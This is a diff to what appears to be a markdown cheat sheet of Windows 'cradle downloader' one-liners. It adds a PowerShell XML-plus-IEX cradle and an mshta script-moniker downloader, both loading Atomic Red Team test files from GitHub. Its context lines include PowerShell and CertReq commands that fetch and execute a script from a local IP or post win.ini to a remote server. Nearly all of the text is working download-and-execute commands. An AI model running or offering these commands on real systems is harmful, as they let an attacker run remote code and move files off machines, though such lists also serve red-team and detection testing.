@@ -2110,6 +2110,8 @@ This section contains onelinner crandle downloaders that for one reason or anoth
 
       [System.Net.WebRequest]::DefaultWebProxy;[System.Net.CredentialCache]::DefaultNetworkCredentials;$h=new-object -com WinHttp.WinHttpRequest.5.1;$h.open('GET','http://192.168.1.73/hello.ps1',$false);$h.send();iex $h.responseText
       
+      powershell.exe -exec bypass -noprofile "$Xml = (New-Object System.Xml.XmlDocument);$Xml.Load('https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.001/src/test.xml');$Xml.command.a.execute | IEX"      
+      
 ![powershell Additional Methods for Remote Download](http://i.cubeupload.com/tMG9I8.jpg)
 
 <br /><br />
@@ -2143,6 +2145,14 @@ This section contains onelinner crandle downloaders that for one reason or anoth
       cmd /c start /b /MIN CertReq.exe -Post -config https://example.org/ c:\windows\win.ini output.txt
 
       powershell -w 1 CertReq.exe -Post -config http://192.168.1.73/hello.ps1 c:\windows\win.ini $env:tmp\Hello.ps1
+      
+![ComDownloader](https://user-images.githubusercontent.com/23490060/96273174-f3040400-0fc6-11eb-82df-40cc1e60b229.png)
+
+<br /><br />
+**mshta Downloaders**<br />
+
+      cmd /c "mshta.exe javascript:a=GetObject('script:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.001/src/mshta.sct').Exec();close()"
+
       
 ![ComDownloader](https://user-images.githubusercontent.com/23490060/96273174-f3040400-0fc6-11eb-82df-40cc1e60b229.png)
 
